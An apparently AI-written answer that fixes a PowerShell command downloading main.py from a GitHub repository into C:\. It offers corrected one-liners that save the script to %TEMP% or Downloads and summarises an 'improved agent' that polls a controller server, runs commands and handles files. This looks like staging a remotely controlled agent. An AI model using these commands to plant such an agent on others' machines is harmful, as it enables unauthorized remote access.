# Agent Improvements and PowerShell Download Fix

## PowerShell Download Issue Analysis

### **The Problem**
Your PowerShell command was failing because of an incorrect file path:
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py" -OutFile "C:/"
```

**Issues:**
1. `"C:/"` is a **directory**, not a file path
2. Writing to C:\ root requires administrator privileges  
3. Mixed path separators (should use `\` on Windows)

### **The Fix**
Use one of these corrected commands instead:

#### **Option 1: Download to Temp Directory (Recommended - No Admin Required)**
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py" -OutFile "$env:TEMP\main.py"
```

#### **Option 2: Download to User Downloads**
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py" -OutFile "$env:USERPROFILE\Downloads\main.py"
```

#### **Option 3: Download to C:\ with Proper Filename (Requires Admin)**
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py" -OutFile "C:\main.py"
```

#### **Option 4: Download with Verification (Recommended)**
```powershell
$file = "$env:TEMP\main.py"; Invoke-WebRequest "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py" -OutFile $file -UseBasicParsing; if(Test-Path $file){"SUCCESS: Downloaded to $file - Size: $((Get-Item $file).Length) bytes"}else{"FAILED: Download failed"}
```

### **Key Improvements Over Original**

| Feature | Original | Improved |
|---------|----------|----------|
| **Error Handling** | Basic try/catch | Comprehensive error handling with specific exceptions |
| **Dependencies** | Hard failures | Graceful degradation with feature flags |
| **Logging** | Print statements | Configurable debug logging system |
| **Connection** | Simple retry | Exponential backoff with max attempts |
| **Commands** | Basic execution | Enhanced with built-in commands and timeouts |
| **Cleanup** | Manual | Automatic resource cleanup |
| **File Operations** | No size limits | Size limits and better validation |

### **Configuration Options**

```python
# Configuration
SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
DEBUG_MODE = False  # Set to True for verbose logging
```

### **Usage Instructions**

1. **Install Dependencies:**
   ```bash
   pip install -r requirements_linux.txt  # On Linux
   pip install -r requirements.txt        # On Windows
   ```

2. **Run the Agent:**
   ```bash
   python agent_improved.py
   ```

3. **Enable Debug Mode:**
   ```python
   DEBUG_MODE = True  # In the configuration section
   ```

### **Testing the Download Fix**

To test if your PowerShell download command works, try this diagnostic command:

```powershell
$url = "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py"
$dest = "$env:TEMP\test_main.py"
Write-Host "Downloading from: $url"
Write-Host "Saving to: $dest"
try {
    Invoke-WebRequest $url -OutFile $dest -UseBasicParsing
    if (Test-Path $dest) {
        $size = (Get-Item $dest).Length
        Write-Host "SUCCESS: Downloaded $size bytes to $dest"
        Get-ChildItem $dest | Format-List Name, Length, CreationTime
    } else {
        Write-Host "ERROR: File was not created"
    }
} catch {
    Write-Host "ERROR: $($_.Exception.Message)"
}
```

This will give you detailed feedback about what's happening with the download.

## Summary

The improved agent provides:
- **Better reliability** with comprehensive error handling
- **Enhanced compatibility** with graceful dependency handling  
- **Improved debugging** with configurable logging
- **Stronger stability** with proper resource management
- **Fixed PowerShell commands** with correct file paths

The PowerShell download issue was simply a path formatting problem - use the corrected commands above and your downloads should work perfectly!
